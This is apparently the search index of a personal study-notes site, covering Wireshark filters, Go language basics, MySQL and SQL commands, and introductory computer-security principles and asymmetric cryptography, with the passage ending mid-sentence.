{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u9996\u9875","text":""},{"location":"#welcome","title":"Welcome!","text":"<p>share something...</p>"},{"location":"wireshark/","title":"Wireshark","text":""},{"location":"wireshark/#filters","title":"Filters","text":""},{"location":"wireshark/#capture_filters","title":"Capture Filters","text":"<p>BPF (Berkeley Packet Filter)\u200b\u200b Syntax <pre><code>[Protocol][Direction][Host/Net]\n</code></pre> Protocol\u200b: ether, ip, ip6, arp, tcp, udp, icmp Direction: src / dst Host / Net: host 192.168.1.1, net 192.168.1.0/24, port 80, portrange 1-1024</p> <p>Logical Operations\u200b: and (&amp;&amp;), or (||), not (!)</p>"},{"location":"wireshark/#display_filters","title":"Display Filters","text":"<p>Wireshark Syntax</p> <p>Port Filter <pre><code>tcp.port==80\ntcp.dstport==80\ntcp.srcport==80\n</code></pre></p> <p>Protocol Filter <pre><code>http\ntcp\nssh\n</code></pre></p> <p>http Filter <pre><code>http.request.method==\"GET\"\n</code></pre></p>"},{"location":"Go/syntax/","title":"Go","text":""},{"location":"Go/syntax/#go","title":"Go","text":""},{"location":"Go/syntax/#packages","title":"Packages <p>Every Go program is made up of packages.</p> <p>Programs start running in package <code>main</code>.</p>","text":""},{"location":"Go/syntax/#import","title":"import","text":"<p><pre><code>import (\n    \"fmt\"\n    \"math\"\n)\n</code></pre> <pre><code>import \"fmt\"\nimport \"math\"\n</code></pre> the package name is the same as the last element of the import path</p>"},{"location":"Go/syntax/#exported_names","title":"Exported names","text":"<p>In Go, a name is exported if it begins with a capital letter <code>math.pi</code> \u00d7 <code>math.Pi</code> \u221a</p>"},{"location":"Go/syntax/#functions","title":"Functions <p><pre><code>func add(x int, y int) int {\n    return x + y\n}\n</code></pre> multiple results <pre><code>func swap(x, y string) (string, string) {\n    return y, x\n}\n\nfunc main() {\n    a, b := swap(\"hello\", \"world\")\n    fmt.Println(a, b)\n}\n</code></pre> Named return values <pre><code>func split(sum int) (x, y int) {\n    x = sum * 4 / 9\n    y = sum - x\n    return\n}\n\nfunc main() {\n    a, b := split(17)\n}\n</code></pre></p>","text":""},{"location":"Go/syntax/#variables","title":"Variables","text":""},{"location":"Go/syntax/#declaration_initialization","title":"Declaration &amp; Initialization","text":"<p><pre><code>var i int\nvar j = 1\nvar (\n    ToBe   bool       = false\n    MaxInt uint64     = 1&lt;&lt;64 - 1\n    z      complex128 = cmplx.Sqrt(-5 + 12i)\n)\nk := 2  // function level only\n</code></pre> Outside a function, every statement begins with a keyword (<code>var</code>, <code>func</code>, and so on) and so the <code>:=</code> construct is not available.</p> <p>Variables declared without an explicit initial value are given their zero value - <code>0</code> for numeric types, - <code>false</code> for the boolean type, and - <code>\"\"</code> (the empty string) for strings.</p>"},{"location":"Go/syntax/#basic_types","title":"Basic Types","text":"<pre><code>bool\n\nstring\n\nint  int8  int16  int32  int64\nuint uint8 uint16 uint32 uint64 uintptr\n\nbyte // alias for uint8\n\nrune // alias for int32\n     // represents a Unicode code point\n\nfloat32 float64\n\ncomplex64 complex128\n</code></pre>"},{"location":"Go/syntax/#type_conversions","title":"Type Conversions","text":"<p>The expression <code>T(v)</code> converts the value <code>v</code> to the type <code>T</code>.</p>"},{"location":"Go/syntax/#type_inference","title":"Type inference","text":"<p>When declaring a variable without specifying an explicit type, the variable's type is inferred from the value on the right hand side. <pre><code>i := 42           // int\nf := 3.142        // float64\ng := 0.867 + 0.5i // complex128\n</code></pre></p>"},{"location":"Go/syntax/#constants","title":"Constants <p><pre><code>const identifier [type] = value\n</code></pre> An untyped constant takes the type needed by its context.</p> <p>Numeric constants are high-precision values.</p>","text":""},{"location":"Go/syntax/#control_flow","title":"Control Flow","text":""},{"location":"Go/syntax/#iteration","title":"Iteration","text":"<p><pre><code>for i := 0; i &lt; 10; i++ {\n    sum += i\n}\n</code></pre> The init and post statements are optional. <code>for</code> is Go's <code>while</code> <pre><code>sum := 1\nfor sum &lt; 1000 {\n    sum += sum\n}\n</code></pre> forever <pre><code>for {\n}\n</code></pre></p>"},{"location":"Go/syntax/#conditon","title":"Conditon","text":""},{"location":"Go/syntax/#if","title":"If","text":"<pre><code>if x &lt; 1 { fmt.Println(x) }\n</code></pre> <p>if with a short statement <pre><code>if v := math.Pow(x, n); v &lt; lim {\n    return v\n}\n</code></pre> Variables declared by the statement are only in scope until the end of the <code>if</code></p>"},{"location":"Go/syntax/#if_and_else","title":"If and Else","text":"<p>Variables declared inside an <code>if</code> short statement are also available inside any of the <code>else</code> blocks. <pre><code>if v := math.Pow(x, n); v &lt; lim {\n    return v\n} else {\n    fmt.Printf(\"%g &gt;= %g\\n\", v, lim)\n}\n</code></pre></p>"},{"location":"Go/syntax/#swith","title":"Swith","text":"<p>Switch cases evaluate cases from top to bottom, stopping when a case succeeds. <pre><code>switch os := runtime.GOOS; os {\ncase \"darwin\":\n    fmt.Println(\"macOS.\")\ncase \"linux\":\n    fmt.Println(\"Linux.\")\ndefault:\n    fmt.Printf(\"%s.\\n\", os)\n}\n</code></pre> no <code>break</code>: Go only runs the selected case, not all the cases that follow.</p> <p>switch with no condition  <pre><code>switch {\ncase t.Hour() &lt; 12:\n    fmt.Println(\"Good morning!\")\ncase t.Hour() &lt; 17:\n    fmt.Println(\"Good afternoon.\")\ndefault:\n    fmt.Println(\"Good evening.\")\n}\n</code></pre></p>"},{"location":"Go/syntax/#defer","title":"Defer","text":"<p>The deferred call's arguments are evaluated immediately, but the function call is not executed until the surrounding function returns.</p> <p>Deferred function calls are pushed onto a stack. When a function returns, its deferred calls are executed in last-in-first-out order. <pre><code>func main() {\n    fmt.Println(\"counting\")\n\n    for i := 0; i &lt; 10; i++ {\n        defer fmt.Println(i)\n    }\n\n    fmt.Println(\"done\")\n}\n</code></pre></p>"},{"location":"Go/syntax/#pointers","title":"Pointers","text":"<pre><code>var p *int \ni := 42\np = &amp;i\n*p = 21\n</code></pre>"},{"location":"Go/syntax/#structs","title":"Structs <pre><code>type Vertex struct {\n    X int \n    Y int \n    // or: X, Y int\n}\n\nvar (\n    v1 = Vertex{1, 2} \n    v1.X = 0\n    v2 = Vertex{X: 1}  // Y:0 is implicit\n    v3 = Vertex{}      // X:0 and Y:0\n    p  = &amp;Vertex{1, 2} // has type *Vertex\n    p.X = 3 // use dot notation \n)\n</code></pre>","text":""},{"location":"Go/syntax/#arrays","title":"Arrays <pre><code>func main() {\n    var a [2]string\n    a[0] = \"Hello\"\n    a[1] = \"World\"\n\n    primes := [6]int{2, 3, 5, 7, 11, 13}\n}\n</code></pre>","text":""},{"location":"Go/syntax/#slices","title":"Slices <pre><code>arr[low : high]\n</code></pre> <p>Slices are like references to arrays Changing the elements of a slice modifies the corresponding elements of its underlying array, and vice versa. <pre><code>Slice\n+--------+-----+-----+\n|  ptr   | len | cap |  \u2190 Slice Header\n+--------+-----+-----+\n    |\n    v\n+---+---+---+---+---+---+---+\n| 0 | 1 | 2 | 3 | 4 | 5 | 6 |  \u2190 Underlying Array\n+---+---+---+---+---+---+---+\n</code></pre></p> <ul> <li> <p>The length of a slice is the number of elements it contains.</p> </li> <li> <p>The capacity of a slice is the number of elements in the underlying array, counting from the first element in the slice.</p> </li> </ul>","text":""},{"location":"Go/syntax/#slice_literals","title":"Slice Literals","text":"<p>This is an array literal: <pre><code>[3]bool{true, true, false}\n</code></pre> And this creates the same array as above, then builds a slice that references it: <pre><code>[]bool{true, true, false}\n</code></pre></p>"},{"location":"Go/syntax/#nil_slices","title":"Nil Slices","text":"<p><pre><code>var s []int\n</code></pre> The zero value of a slice is <code>nil</code>. A nil slice has a length and capacity of 0 and has no underlying array.</p>"},{"location":"Go/syntax/#make","title":"Make","text":"<p>Slices can be created with the built-in <code>make</code> function; this is how you create dynamically-sized arrays. <pre><code>a := make([]int, 5)  // len(a)=5\n\nb := make([]int, 0, 5) // len(b)=0, cap(b)=5\nb = b[:cap(b)] // len(b)=5, cap(b)=5\nb = b[1:]      // len(b)=4, cap(b)=4\n</code></pre> 0 \u2264 low \u2264 high \u2264 cap(s) <pre><code>b := make([]int, 0, 5)  // len(b)=0, cap(b)=5\nc := b[:3]  // [0:3] correct\nc := b[2:]  // [2:0] error\n</code></pre></p>"},{"location":"Go/syntax/#slices_of_slices","title":"Slices of slices","text":"<p><pre><code>board := [][]string{\n    []string{\"_\", \"_\", \"_\"},\n    []string{\"_\", \"_\", \"_\"},\n    []string{\"_\", \"_\", \"_\"}, // &lt;- comma here\n}\n</code></pre> <pre><code>+---------------+\n| board0        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n| board1        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n| board2        | \u2192 [\"_\", \"_\", \"_\"]\n+---------------+\n</code></pre></p>"},{"location":"Go/syntax/#appending_to_a_slice","title":"Appending to a slice","text":"<p><pre><code>func append(s []T, vs ...T) []T\n</code></pre> <pre><code>arr := [5]int{1, 2, 3, 4, 5} \ns := arr[:3]                // s = [1, 2, 3], len=3, cap=5\ns = append(s, 6)            // modify the underlying array\nfmt.Println(s)              // [1, 2, 3, 6]\nfmt.Println(arr)            // [1, 2, 3, 6, 5]\n</code></pre> <pre><code>s := []int{1, 2, 3}        \ns = append(s, 4)           // allocate a new, larger underlying array\nfmt.Println(s)             // [1, 2, 3, 4]\nfmt.Println(cap(s))        // maybe 6, denpends on the strategy\n</code></pre></p> <p><pre><code>combinedSlice := append(slice1, slice2...)\n</code></pre> <pre><code>slice1 := []int{1, 2, 3}\nslice2 := []int{4, 5, 6}\n\ncombined := append(slice1, slice2...)\nfmt.Println(combined) // [1 2 3 4 5 6]\n</code></pre></p>"},{"location":"Go/syntax/#range","title":"Range","text":"<p>The <code>range</code> form of the <code>for</code> loop iterates over a slice or map. <pre><code>var pow = []int{1, 2, 4, 8, 16, 32, 64, 128}\n\nfor i, v := range pow {...}\n\nfor i, _ := range pow\nfor i := range pow\n\nfor _, value := range pow\n</code></pre></p>"},{"location":"Go/syntax/#map","title":"Map <p>The zero value of a map is <code>nil</code>. A <code>nil</code> map has no keys, nor can keys be added. <pre><code>var m map[string]int\nm[\"key\"] = 1 // panic: assignment to nil map\n</code></pre> The <code>make</code> function returns a map of the given type, initialized and ready for use. <pre><code>m := make(map[string]int)\nm[\"Alice\"] = 25\n</code></pre></p>","text":""},{"location":"Go/syntax/#map_literals","title":"Map Literals","text":"<p><pre><code>type Vertex struct {\n    Lat, Long float64\n}\n\nvar m = map[string]Vertex{\n    \"Bell Labs\": Vertex{\n        40.68433, -74.39967,\n    },\n    \"Google\": Vertex{\n        37.42202, -122.08408,\n    },\n}\n</code></pre> If the top-level type is just a type name, you can omit it from the elements of the literal. <pre><code>var m = map[string]Vertex{\n    \"Bell Labs\": {40.68433, -74.39967},\n    \"Google\":    {37.42202, -122.08408},\n}\n</code></pre></p>"},{"location":"Go/syntax/#mutating_maps","title":"Mutating Maps","text":"<p><pre><code>m[key] = elem   // insert\nelem = m[key]   // retrieve\ndelete(m, key)  // delete\nelem, ok = m[key]   // Test that a key is present\n// - If key is in m, then elem is the value of key, ok is true\n// - If key is not in the map, then elem is zero value, ok is false\n</code></pre> <pre><code>func WordCount(s string) map[string]int {\n    words := strings.Fields(s) \n    cntmap := make(map[string]int)\n    for _, w := range words {\n        cntmap[w]++     // if w not in cntmap, return zero value! (different from python)\n    }\n    return cntmap\n}\n</code></pre></p>"},{"location":"Go/syntax/#function_value","title":"Function Value","text":"<p>Function values may be used as function arguments and return values. <pre><code>func compute(fn func(float64, float64) float64) float64 {\n    return fn(3, 4)\n}\n\nfunc main() {\n    hypot := func(x, y float64) float64 {\n        return math.Sqrt(x*x + y*y)\n    }\n    fmt.Println(hypot(5, 12))\n\n    fmt.Println(compute(hypot))\n    fmt.Println(compute(math.Pow))\n}\n</code></pre></p>"},{"location":"Go/syntax/#function_closure","title":"Function Closure","text":"<p>A closure is a function value that references variables from outside its body. The function may access and assign to the referenced variables; in this sense the function is \"bound\" to the variables. <pre><code>func adder() func(int) int {\n    sum := 0\n    return func(x int) int {\n        sum += x\n        return sum\n    }\n}\n\nfunc main() {\n    pos, neg := adder(), adder()\n    for i := 0; i &lt; 10; i++ {\n        fmt.Println(\n            pos(i),\n            neg(-2*i),\n        )\n    }\n}\n</code></pre></p>"},{"location":"Go/syntax/#methods","title":"Methods <p>Go does not have classes. However, you can define methods on types.</p> <p>A method is a function with a special receiver argument.</p> <p>The receiver appears in its own argument list between the <code>func</code> keyword and the method name. <pre><code>type Vertex struct {\n    X, Y float64\n}\n\nfunc (v Vertex) Abs() float64 { //  a receiver of type Vertex named v.\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n\nfunc main() {\n    v := Vertex{3, 4}\n    fmt.Println(v.Abs())\n}\n</code></pre> equivalent to  <pre><code>func Abs(v Vertex) float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n</code></pre> You can only declare a method with a receiver whose type is defined in the same package as the method. You cannot declare a method with a receiver whose type is defined in another package (which includes the built-in types such as int). <pre><code>type MyFloat float64\n\nfunc (f MyFloat) Abs() float64 {    // cannot use float64 directly\n    if f &lt; 0 {\n        return float64(-f)\n    }\n    return float64(f)\n}\n</code></pre> With a value receiver, the Scale method operates on a copy of the original Vertex value. Methods with pointer receivers can modify the value to which the receiver points.</p> <pre><code>type Vertex struct {\n    X, Y float64\n}\n\nfunc (v Vertex) Abs() float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n\nfunc (v *Vertex) Scale(f float64) {\n    v.X = v.X * f\n    v.Y = v.Y * f\n}\n\nfunc main() {\n    v := Vertex{3, 4}   \n    v.Scale(10)     // automatically retrieve address &amp;v and pass to Scale\n    fmt.Println(v.Abs())\n}\n</code></pre>","text":""},{"location":"Go/syntax/#pointer_indirection","title":"Pointer indirection","text":"<p>Functions with a pointer argument must take a pointer: <pre><code>var v Vertex\nScaleFunc(v, 5)  // Compile error!\nScaleFunc(&amp;v, 5) // OK\n</code></pre> while methods with pointer receivers take either a value or a pointer as the receiver when they are called: <pre><code>var v Vertex\nv.Scale(5)  // OK\np := &amp;v\np.Scale(10) // OK\n</code></pre> Functions that take a value argument must take a value of that specific type: <pre><code>var v Vertex\nfmt.Println(AbsFunc(v))  // OK\nfmt.Println(AbsFunc(&amp;v)) // Compile error!\n</code></pre> while methods with value receivers take either a value or a pointer as the receiver when they are called: <pre><code>var v Vertex\nfmt.Println(v.Abs()) // OK\np := &amp;v\nfmt.Println(p.Abs()) // OK\n</code></pre></p>"},{"location":"Go/syntax/#interface","title":"Interface <p>An interface type is defined as a set of method signatures.</p>","text":""},{"location":"Go/syntax/#implementation","title":"Implementation","text":"<p>Interfaces are implemented implicitly A type implements an interface by implementing its methods. There is no explicit declaration of intent, no \"implements\" keyword.</p> <p>A value of interface type can hold any value that implements those methods. <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"math\"\n)\n\ntype Abser interface {\n    Abs() float64\n}\n\nfunc main() {\n    var a Abser\n    f := MyFloat(-math.Sqrt2)\n    v := Vertex{3, 4}\n\n    a = f  // a MyFloat implements Abser\n    fmt.Println(a.Abs())    // 1.4142135623730951\n\n    a = &amp;v // a *Vertex implements Abser\n    fmt.Println(a.Abs())    // 5\n\n    // v is a Vertex (not *Vertex) and does NOT implement Abser.\n    a = v   // error\n\n\n}\n\ntype MyFloat float64\n\nfunc (f MyFloat) Abs() float64 {\n    if f &lt; 0 {\n        return float64(-f)\n    }\n    return float64(f)\n}\n\ntype Vertex struct {\n    X, Y float64\n}\n\nfunc (v *Vertex) Abs() float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n</code></pre></p>"},{"location":"Go/syntax/#interface_values","title":"Interface values","text":"<p>Under the hood, interface values can be thought of as a tuple of a value and a concrete type: <pre><code>(value, type)\n</code></pre> An interface value holds a value of a specific underlying concrete type. Calling a method on an interface value executes the method of the same name on its underlying type.</p>"},{"location":"Go/syntax/#interface_values_with_nil_underlying_values","title":"Interface values with nil underlying values","text":"<p>If the concrete value inside the interface itself is nil, the method will be called with a nil receiver.</p> <p>Note that an interface value that holds a nil concrete value is itself non-nil. <pre><code>type I interface {\n    M()\n}\n\ntype T struct {\n    S string\n}\n\nfunc (t *T) M() {\n    if t == nil {\n        fmt.Println(\"&lt;nil&gt;\")\n        return\n    }\n    fmt.Println(t.S)\n}\n\n\nfunc main() {\n    var i I\n    var t *T\n    i = t\n    describe(i)\n    i.M()\n}\n\nfunc describe(i I) {\n    fmt.Printf(\"(%v, %T)\\n\", i, i)\n}\n</code></pre></p>"},{"location":"Go/syntax/#nil_interface_values","title":"Nil interface values","text":"<p>A nil interface value holds neither value nor concrete type.</p> <p>Calling a method on a nil interface is a run-time error because there is no type inside the interface tuple to indicate which concrete method to call. <pre><code>func main() {\n    var i I\n    i.M()   // error\n}\n</code></pre></p>"},{"location":"Go/syntax/#the_empty_interface","title":"The empty interface","text":"<p>The interface type that specifies zero methods is known as the empty interface: <pre><code>interface{}\n</code></pre></p> <p>Empty interfaces are used by code that handles values of unknown type.  For example, <code>fmt.Print</code> takes any number of arguments of type <code>interface{}</code>.</p>"},{"location":"Go/syntax/#type_assertions","title":"Type assertions","text":"<p>A type assertion provides access to an interface value's underlying concrete value. <pre><code>t := i.(T)\n</code></pre> This statement asserts that the interface value i holds the concrete type T and assigns the underlying T value to the variable t. If i does not hold a T, the statement will trigger a panic.</p> <p>To test whether an interface holds a specific type: <pre><code>t, ok := i.(T)\n</code></pre></p>"},{"location":"Go/syntax/#type_switches","title":"Type switches","text":"<p>A type switch is a construct that permits several type assertions in series. <pre><code>switch v := i.(type) {\ncase T:\n    // here v has type T\ncase S:\n    // here v has type S\ndefault:\n    // no match; here v has the same type as i\n}\n</code></pre></p>"},{"location":"Go/syntax/#stringer","title":"Stringer","text":"<p>One of the most ubiquitous interfaces is <code>Stringer</code> defined by the <code>fmt</code> package. <pre><code>type Stringer interface {\n    String() string\n}\n</code></pre> A <code>Stringer</code> is a type that can describe itself as a string. The <code>fmt</code> package (and many others) look for this interface to print values.</p> <p>pseudocode of fmt.Println() <pre><code>func Println(a ...interface{}) {\n    for _, v := range a {\n        if s, ok := v.(fmt.Stringer); ok {\n            // call String() if implemented\n            fmt.Print(s.String())\n        } else {\n            // or use reflection to get the default format \n            fmt.Print(defaultFormat(v))\n        }\n    }\n}\n</code></pre> <pre><code>type Person struct {\n    Name string\n    Age  int\n}\n\nfunc (p Person) String() string {\n    return fmt.Sprintf(\"%v (%v years)\", p.Name, p.Age)\n}\n</code></pre></p>"},{"location":"Go/syntax/#errors","title":"Errors","text":"<pre><code>type error interface {\n    Error() string\n}\n</code></pre> <pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\ntype ErrNegativeSqrt float64\n\nfunc (e ErrNegativeSqrt) Error() string {\n    return fmt.Sprintf(\"cannot Sqrt negative number: %v\", float64(e))\n}\n\nfunc Sqrt(x float64) (float64, error) {\n    if x &lt; 0 {\n        return 0, ErrNegativeSqrt(x)\n    }\n\n    z := 1.0\n    for i := 0; i &lt; 10; i++ {\n        z -= (z*z - x) / (2 * z)\n    }\n    return z, nil\n}\n\nfunc main() {\n    fmt.Println(Sqrt(2))\n    fmt.Println(Sqrt(-2))\n}\n</code></pre>"},{"location":"Go/syntax/#readers","title":"Readers","text":""},{"location":"Go/syntax/#images","title":"Images","text":"<p>Package image defines the Image interface: <pre><code>package image\n\ntype Image interface {\n    ColorModel() color.Model\n    Bounds() Rectangle\n    At(x, y int) color.Color\n}\n</code></pre></p>"},{"location":"Go/syntax/#generics","title":"Generics","text":""},{"location":"Go/syntax/#generic_functions","title":"Generic functions","text":"<p>Go functions can be written to work on multiple types using type parameters.  The type parameters of a function appear between brackets, before the function's arguments. <pre><code>func Index[T comparable](s []T, x T) int {\n    for i, v := range s {\n        // v and x are type T, which has the comparable\n        // constraint, so we can use == here.\n        if v == x {\n            return i\n        }\n    }\n    return -1\n}\n\nfunc main() {\n    si := []int{10, 20, 15, -10}\n    fmt.Println(Index(si, 15))\n\n    ss := []string{\"foo\", \"bar\", \"baz\"}\n    fmt.Println(Index(ss, \"hello\"))\n}\n</code></pre></p>"},{"location":"Go/syntax/#generic_types","title":"Generic types","text":"<p>A type can be parameterized with a type parameter, which could be useful for implementing generic data structures. <pre><code>type List[T any] struct {\n    next *List[T]\n    val  T\n}\n\nfunc InsertAtHead[T any](head **List[T], value T) {\n    newNode := &amp;List[T]{val: value, next: *head}\n    *head = newNode\n}\n\nfunc InsertAtTail[T any](head **List[T], value T) {\n    newNode := &amp;List[T]{val: value, next: nil}\n    if *head == nil {\n        *head = newNode\n        return\n    }\n    current := *head\n    for current.next != nil {\n        current = current.next\n    }\n    current.next = newNode\n}\n\nfunc main() {\n    var head *List[int]\n    node := &amp;List[int]{\n        val:  42,      \n        next: nil,\n    }\n\n    InsertAtHead(&amp;head, 1)\n}\n</code></pre></p>"},{"location":"SQL/MySQL/","title":"MySQL","text":""},{"location":"SQL/MySQL/#mysql","title":"MySQL \u57fa\u672c\u547d\u4ee4   <ul> <li>Note that all text commands must be first on line and end with ';'</li> <li>\u5927\u5c0f\u5199\u90fd\u53ef\u4ee5</li> </ul>","text":""},{"location":"SQL/MySQL/#_1","title":"\u6570\u636e\u5e93\u64cd\u4f5c","text":"<p>\u67e5\u770b\u6570\u636e\u5e93 <pre><code>SHOW DATABASES;\n</code></pre></p> <p>\u521b\u5efa\u6570\u636e\u5e93 <pre><code>CREATE DATABASE my_database;\n</code></pre></p> <p>\u4f7f\u7528\u6570\u636e\u5e93 <pre><code>USE my_databases;\n</code></pre></p> <p>\u5bfc\u5165\u548c\u5bfc\u51fa\u6570\u636e\u5e93 - \u5bfc\u5165 <pre><code>mysql -u root -p my_database &lt; /path/to/file.sql\n</code></pre> - \u5bfc\u51fa <pre><code>mysqldump -u root -p my_database &gt; /path/to/file.sql\n</code></pre></p> <p>\u5220\u9664\u6570\u636e\u5e93 <pre><code>DROP DATABASE my_database;\n</code></pre></p>"},{"location":"SQL/MySQL/#_2","title":"\u6570\u636e\u8868\u64cd\u4f5c","text":"<p>\u67e5\u770b\u8868 <pre><code>SHOW TABLES;\n</code></pre></p> <p>\u521b\u5efa\u8868 <pre><code>CREATE TABLE users (\n    id INT AUTO_INCREMENT PRIMARY KEY,\n    name VARCHAR(100),\n    email VARCHAR(100)\n);\n</code></pre></p> <p>\u67e5\u770b\u8868\u7ed3\u6784 <pre><code>DESCRIBE users;\nDESC users;  -- \u7b80\u5199\nSHOW COLUMNS FROM users;\n</code></pre></p> <p>\u4fee\u6539\u8868\u7ed3\u6784 <pre><code>ALTER TABLE table_name ADD column_name datatype;  -- \u6dfb\u52a0\u5217\nALTER TABLE table_name DROP COLUMN column_name;  -- \u5220\u9664\u5217\nALTER TABLE table_name MODIFY COLUMN column_name new_datatype;  -- \u4fee\u6539\u5217\u7c7b\u578b\nALTER TABLE table_name RENAME TO new_table_name;  -- \u91cd\u547d\u540d\u8868\n</code></pre></p> <p>\u5220\u9664\u6570\u636e\u8868 <pre><code>DROP TABLE users;\n</code></pre></p>"},{"location":"SQL/MySQL/#dml","title":"\u6570\u636e\u64cd\u4f5c (DML)","text":"<p>\u63d2\u5165\u6570\u636e <pre><code>INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');\n-- \u63d2\u5165\u591a\u884c\nINSERT INTO table_name (column1, column2, ...) \nVALUES \n    (value1, value2, ...),\n    (value1, value2, ...),\n    ...;\n</code></pre></p> <p>\u67e5\u8be2\u6570\u636e\uff08\u67e5\u8868\uff09 <pre><code>SELECT \n    field1,field2, ...\nFROM \n    table1,table2,...\n[WHERE condition1 AND/OR condition2...]\n[GROUP BY column_name]\n[HAVING group_condition]\n[ORDER BY column_name [ASC|DESC]]\n[LIMIT [offset,] row_count];\n</code></pre></p> <ul> <li>\u57fa\u672c\u67e5\u8be2 <pre><code>SELECT * FROM table_name;  -- \u67e5\u8be2\u6240\u6709\u5217\nSELECT column1, column2 FROM table_name;  -- \u67e5\u8be2\u7279\u5b9a\u5217\n</code></pre></li> <li>\u6761\u4ef6\u67e5\u8be2 <pre><code>SELECT * FROM table_name WHERE column1 = value;\nSELECT * FROM table_name WHERE column1 &gt; value;\nSELECT * FROM table_name WHERE NOT column1 = value;\nSELECT * FROM table_name WHERE column1 BETWEEN value1 AND value2;\nSELECT * FROM table_name WHERE column1 LIKE 'pattern%';\nSELECT * FROM table_name WHERE column1 IN (value1, value2, ...);\n</code></pre></li> <li>\u6392\u5e8f <pre><code>SELECT * FROM table_name ORDER BY column1 DESC;  \n-- ASC\uff08\u9ed8\u8ba4\uff09ascending/ DESC descending\nSELECT * FROM table_name ORDER BY 1;  \n-- \u4e5f\u53ef\u4ee5\u7528\u7d22\u5f15\uff08\u4ece1\u5f00\u59cb\uff09\n</code></pre></li> <li> <p>\u9650\u5236 <pre><code>SELECT * FROM table_name LIMIT 10;  -- \u524d10\u6761\nSELECT * FROM table_name LIMIT 5, 10;  -- \u4ece\u7b2c6\u6761\u5f00\u59cb\u768410\u6761\n</code></pre></p> </li> <li> <p>\u6574\u5408 <pre><code>SELECT CONCAT(col_name1,col_name2...) FROM tabel_name//\u6574\u5408\u5217\u6570\u636e\nSELECT GROUP_CONCAT(col_name1,col_name2...) FROM tabel_name//\u6574\u5408\u884c\u3001\u5217\u6570\u636e\uff08\u5148\u5217\u518d\u884c\uff09\n</code></pre> \u6548\u679c </p> </li> <li> <p>\u8054\u5408\u67e5\u8be2 <pre><code>-- \u5408\u5e76\u4e24\u4e2a\u67e5\u8be2\u7ed3\u679c\nSELECT ...\nUNION\nSELECT ...\n</code></pre> \u6ce8\u610f\u524d\u540e\u5217\u6570\u4e00\u81f4 </p> </li> <li> <p>\u805a\u5408\u51fd\u6570 <pre><code>SELECT COUNT(*) FROM table_name;\nSELECT SUM(column1) FROM table_name;\nSELECT AVG(column1) FROM table_name;\nSELECT MAX(column1) FROM table_name;\nSELECT MIN(column1) FROM table_name;\n</code></pre></p> </li> <li> <p>\u5206\u7ec4\u67e5\u8be2 <pre><code>SELECT column1, COUNT(*) \nFROM table_name \nGROUP BY column1\nHAVING COUNT(*) &gt; 5;\n</code></pre></p> </li> </ul> <p>\u66f4\u65b0\u6570\u636e <pre><code>UPDATE users \nSET email = 'john.doe@example.com' \nWHERE name = 'John Doe';\n</code></pre></p> <p>\u5220\u9664\u6570\u636e <pre><code>DELETE FROM users WHERE name = 'John Doe';\n</code></pre></p> <p>\u4f7f\u7528\u5e2e\u52a9 <pre><code>HELP;\nHELP SHOW;//\u67e5\u770b\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\n</code></pre></p>"},{"location":"SQL/SQL/","title":"SQL","text":""},{"location":"SQL/SQL/#creating_tables","title":"Creating Tables","text":"<pre><code>CREATE TABLE [table_name] AS\n  SELECT [val1] AS [column1], [val2] AS [column2], ... UNION\n  SELECT [val3]             , [val4]             , ... UNION\n  SELECT [val5]             , [val6]             , ...;\n</code></pre>"},{"location":"SQL/SQL/#selecting_from_tables","title":"Selecting From Tables","text":""},{"location":"SQL/enter/","title":"Enter","text":""},{"location":"SQL/enter/#mysql","title":"\u8fdb\u5165MySQL  <p>1. phpstudy_pro \u4e2d\u542f\u52a8MySQL 2. \u8fdb\u5165\u7ec8\u7aef </p>","text":""},{"location":"cs161/principles/","title":"Principles","text":""},{"location":"cs161/principles/#security_principles","title":"Security Principles","text":""},{"location":"cs161/principles/#threat_model","title":"Threat Model","text":"<p>A threat model is a model of who your attacker is and what resources they have. Understanding your threat model has to do with understanding who and why might someone attack you</p> <p>common assumptions</p>"},{"location":"cs161/principles/#consider_human_factors","title":"Consider Human Factors","text":"<p>Security systems must be usable by ordinary people, and therefore must be designed to take into account the role that humans will play. </p>"},{"location":"cs161/principles/#detect","title":"Detect","text":""},{"location":"cs161/principles/#defense_in_depth","title":"Defense in depth","text":"<p>Multiple types of defenses should be layered together so an attacker would have to breach all the defenses to successfully attack a system.</p>"},{"location":"cs161/principles/#least_privilege","title":"Least Privilege","text":"<p>Try to minimize how much privilege you give each program and system component.</p>"},{"location":"cs161/principles/#seperation_of_responsipility","title":"Seperation of responsipility","text":"<p>Split up privilege, so no one person or program has complete power. Require more than one party to approve before access is granted.</p>"},{"location":"cs161/principles/#ensure_complete_mediation","title":"Ensure complete mediation","text":"<p>When enforcing access control policies, make sure that you check every access to every object.</p> <p>Time-Of-Check To Time-Of-Use (TOCTTOU) vulnerability</p>"},{"location":"cs161/principles/#shannons_maxim","title":"Shannon's Maxim","text":"<p>Shannon\u2019s Maxim states that the attacker knows the system that they are attacking.</p> <p>\u201cSecurity through obscurity\u201d refers to systems that rely on the secrecy of their design, algorithms, or source code to be secure.</p> <p>A closely related principle is Kerckhoff\u2019s Principle, which states that cryptographic systems should remain secure even when the attacker knows all internal details of the system.</p>"},{"location":"cs161/principles/#fail-safe_defaults","title":"Fail-Safe Defaults","text":"<p>Choose default settings that \u201cfail safe\u201d, balancing security with usability when a system goes down.</p>"},{"location":"cs161/principles/#trusted_computing_base_tcb","title":"Trusted Computing Base (TCB)","text":""},{"location":"cs161/Cryptography/asymmetric/","title":"Asymmetric","text":""},{"location":"cs161/Cryptography/asymmetric/#asymmetric_cryptography","title":"Asymmetric cryptography  \\[ \\begin{aligned} KeyGen()-&gt;(PK,SK)\\\\ Enc(M, PK)-&gt;C\\\\ Dec(C, SK)-&gt;M \\end{aligned} \\]","text":""},{"location":"cs161/Cryptography/asymmetric/#trapdoor_one-way_functions","title":"Trapdoor One-way Functions","text":"<p>A trapdoor one-way function is a function that is one-way, but also has a special backdoor that enables someone 